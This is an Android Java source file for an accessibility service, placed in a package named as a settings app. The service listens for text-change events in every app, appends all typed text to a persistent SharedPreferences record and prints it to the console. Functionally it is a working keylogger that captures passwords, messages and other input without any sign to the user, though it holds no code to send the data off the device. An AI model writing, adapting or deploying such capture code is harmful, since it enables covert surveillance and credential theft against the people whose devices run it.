package com.example.settings;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.SharedPreferences;
import android.view.accessibility.AccessibilityEvent;

public class MyAccessibilityService extends AccessibilityService {
        public static final String MyPREFERENCES = "MyPrefs" ;
        SharedPreferences sharedpreferences;
        SharedPreferences.Editor editor;
        @Override
        public void onAccessibilityEvent(AccessibilityEvent event) {
            final int eventType = event.getEventType();
            sharedpreferences = getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
            String eventText = "";

            switch(eventType) {

           /*     case AccessibilityEvent.TYPE_VIEW_CLICKED:
                     eventText = "Clicked: ";
                     break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                     eventText = "Focused: ";
                     break;*/

                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:

                    break;

            }
            editor = sharedpreferences.edit();
            String mm=sharedpreferences.getString("textdata","");
            StringBuilder mBuilder=new StringBuilder();
            mBuilder.append(mm+eventText + event.getText());
            mm=eventText = eventText + event.getText();
            editor.putString("textdata",mBuilder.toString());
            editor.commit();

            //print the typed text in the console. Or do anything you want here.
            System.out.println("ACCESSIBILITY SERVICE : "+eventText + "Sharedwala : "+mm);

        }

        @Override
        public void onInterrupt() {
            //whatever
        }

        @Override
        public void onServiceConnected() {
            //configure our Accessibility service
            AccessibilityServiceInfo info = getServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
            info.notificationTimeout = 100;
            this.setServiceInfo(info);
        }
}
